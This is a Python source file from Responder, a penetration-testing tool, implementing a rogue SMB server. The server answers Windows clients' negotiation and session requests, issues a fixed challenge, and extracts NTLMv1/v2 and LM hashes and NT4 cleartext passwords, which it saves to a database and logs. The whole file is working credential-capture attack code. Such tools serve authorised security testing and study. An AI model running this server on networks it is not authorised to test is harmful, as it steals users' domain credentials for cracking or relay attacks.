#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import settings

from random import randrange
from packets import SMBHeader, SMBNegoAnsLM, SMBNegoAns, SMBNegoKerbAns, SMBSession1Data, SMBSession2Accept, SMBSessEmpty, SMBTreeData
from SocketServer import BaseRequestHandler
from utils import *

# Detect if SMB auth was Anonymous
def Is_Anonymous(data):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]

	if SecBlobLen < 260:
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		return True if LMhashLen == 0 or LMhashLen == 1 else False

	if SecBlobLen > 260:
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		return True if LMhashLen == 0 or LMhashLen == 1 else False

def Is_LMNT_Anonymous(data):
	LMhashLen = struct.unpack('<H',data[51:53])[0]
	return True if LMhashLen == 0 or LMhashLen == 1 else False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
	Dialect = tuple([e.replace('\x00','') for e in data[40:].split('\x02')[:10]])

	if Dialect[0] == "NT LM 0.12":
		return "\x00\x00"
	if Dialect[1] == "NT LM 0.12":
		return "\x01\x00"
	if Dialect[2] == "NT LM 0.12":
		return "\x02\x00"
	if Dialect[3] == "NT LM 0.12":
		return "\x03\x00"
	if Dialect[4] == "NT LM 0.12":
		return "\x04\x00"
	if Dialect[5] == "NT LM 0.12":
		return "\x05\x00"
	if Dialect[6] == "NT LM 0.12":
		return "\x06\x00"
	if Dialect[7] == "NT LM 0.12":
		return "\x07\x00"
	if Dialect[8] == "NT LM 0.12":
		return "\x08\x00"
	if Dialect[9] == "NT LM 0.12":
		return "\x09\x00"
	if Dialect[10] == "NT LM 0.12":
		return "\x0a\x00"
	if Dialect[11] == "NT LM 0.12":
		return "\x0b\x00"
	if Dialect[12] == "NT LM 0.12":
		return "\x0c\x00"
	if Dialect[13] == "NT LM 0.12":
		return "\x0d\x00"
	if Dialect[14] == "NT LM 0.12":
		return "\x0e\x00"
	if Dialect[15] == "NT LM 0.12":
		return "\x0f\x00"

#Set MID SMB Header field.
def midcalc(data):
    pack=data[34:36]
    return pack

#Set UID SMB Header field.
def uidcalc(data):
    pack=data[32:34]
    return pack

#Set PID SMB Header field.
def pidcalc(data):
    pack=data[30:32]
    return pack

#Set TID SMB Header field.
def tidcalc(data):
    pack=data[28:30]
    return pack

def ParseShare(data):
	packet = data[:]
	a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
	if a:
		print text("[SMB] Requested Share     : %s" % a.group(0).replace('\x00', ''))

#Parse SMB NTLMSSP v1/v2
def ParseSMBHash(data,client):
	SecBlobLen = struct.unpack('<H',data[51:53])[0]
	BccLen     = struct.unpack('<H',data[61:63])[0]

	if SecBlobLen < 260:
		SSPIStart    = data[75:]
		LMhashLen    = struct.unpack('<H',data[89:91])[0]
		LMhashOffset = struct.unpack('<H',data[91:93])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen    = struct.unpack('<H',data[97:99])[0]
		NthashOffset = struct.unpack('<H',data[99:101])[0]

	else:
		SSPIStart    = data[79:]
		LMhashLen    = struct.unpack('<H',data[93:95])[0]
		LMhashOffset = struct.unpack('<H',data[95:97])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen    = struct.unpack('<H',data[101:103])[0]
		NthashOffset = struct.unpack('<H',data[103:105])[0]

	if NthashLen == 24:
		SMBHash      = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen    = struct.unpack('<H',data[105:107])[0]
		DomainOffset = struct.unpack('<H',data[107:109])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen      = struct.unpack('<H',data[113:115])[0]
		UserOffset   = struct.unpack('<H',data[115:117])[0]
		Username     = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 60:
		SMBHash      = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen    = struct.unpack('<H',data[109:111])[0]
		DomainOffset = struct.unpack('<H',data[111:113])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen      = struct.unpack('<H',data[117:119])[0]
		UserOffset   = struct.unpack('<H',data[119:121])[0]
		Username     = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})

# Parse SMB NTLMv1/v2
def ParseLMNTHash(data, client):

	LMhashLen = struct.unpack('<H',data[51:53])[0]
	NthashLen = struct.unpack('<H',data[53:55])[0]
	Bcc = struct.unpack('<H',data[63:65])[0]
	Username, Domain = tuple([e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]])

	if NthashLen > 25:
		FullHash = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex')
		LmHash = FullHash[:32].upper()
		NtHash = FullHash[32:].upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, LmHash, NtHash)
	
		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

	if NthashLen == 24:
		NtHash = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
		LmHash = data[65:65+LMhashLen].encode('hex').upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LmHash, NtHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

def IsNT4ClearTxt(data, client):
	HeadLen = 36

	if data[14:16] == "\x03\x80":
		SmbData = data[HeadLen+14:]
		WordCount = data[HeadLen]
		ChainedCmdOffset = data[HeadLen+1]

		if ChainedCmdOffset == "\x75":
			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]

			if PassLen > 2:

				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
				print text("[SMB] Clear Text Credentials: %s:%s" % (User,Password))
				WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)

# SMB Server class, NTLMSSP
class SMB1(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(1)

				if len(data) < 1:
					break

				##session request 139
				if data[0] == "\x81":
					Buffer = "\x82\x00\x00\x00"
					try:
					        self.request.send(Buffer)
						data = self.request.recv(1024)
					except:
						pass

				# Negociate Protocol Response
				if data[8:10] == "\x72\x00":
					# \x72 == Negociate Protocol Response
					Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
					Body.calculate()
		
					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(1024)

				# Session Setup AndX Request
				if data[8:10] == "\x73\x00":
					IsNT4ClearTxt(data, self.client_address[0])
					
					# STATUS_MORE_PROCESSING_REQUIRED
					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
					Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge)
					Body.calculate()
		
					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(4096)

					# STATUS_SUCCESS
					if data[8:10] == "\x73\x00":
						if Is_Anonymous(data):
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
							Body = SMBSessEmpty()

							Packet = str(Header)+str(Body)
							Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

							self.request.send(Buffer)

						else:
							# Parse NTLMSSP_AUTH packet
							ParseSMBHash(data,self.client_address[0])

							# Send STATUS_SUCCESS
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
							Body = SMBSession2Accept()
							Body.calculate()

							Packet = str(Header)+str(Body)
							Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

							self.request.send(Buffer)
							data = self.request.recv(1024)
				
				# Tree Connect AndX Request
				if data[8:10] == "\x75\x00":
					ParseShare(data)
					# Tree Connect AndX Response
					Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
					Body = SMBTreeData()
					Body.calculate()

					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(1024)

				##Tree Disconnect.
				if data[8:10] == "\x71\x00":
					Header = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Body = "\x00\x00\x00"

					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet
					
					self.request.send(Buffer)
					data = self.request.recv(1024)
				
				##NT_CREATE Access Denied.
				if data[8:10] == "\xa2\x00":
					Header = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Body = "\x00\x00\x00"

					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(1024)
				
				##Trans2 Access Denied.
				if data[8:10] == "\x25\x00":
					Header = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Body = "\x00\x00\x00"

					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(1024)
				
				##LogOff.
				if data[8:10] == "\x74\x00":
					Header = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Body = "\x02\xff\x00\x27\x00\x00\x00"

					Packet = str(Header)+str(Body)
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet

					self.request.send(Buffer)
					data = self.request.recv(1024)

		except socket.timeout:
			pass

# SMB Server class, old version
class SMB1LM(BaseRequestHandler):

	def handle(self):
		try:
			self.request.settimeout(0.5)
			data = self.request.recv(1024)
			
			##session request 139
			if data[0] == "\x81":
				Buffer = "\x82\x00\x00\x00"
				self.request.send(Buffer)
				data = self.request.recv(1024)
			
			##Negotiate proto answer.
			if data[8:10] == "\x72\x00":
				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
				Body = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=settings.Config.Challenge)
				Body.calculate()
				Packet = str(head)+str(Body)
				Buffer = struct.pack(">i", len(''.join(Packet)))+Packet
				self.request.send(Buffer)
				data = self.request.recv(1024)
			
			##Session Setup AndX Request
			if data[8:10] == "\x73\x00":
				if Is_LMNT_Anonymous(data):
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Packet = str(head)+str(SMBSessEmpty())
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet
					self.request.send(Buffer)

				else:
					ParseLMNTHash(data,self.client_address[0])
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
					Packet = str(head)+str(SMBSessEmpty())
					Buffer = struct.pack(">i", len(''.join(Packet)))+Packet
					self.request.send(Buffer)
					data = self.request.recv(1024)

		except Exception:
			self.request.close()
			pass
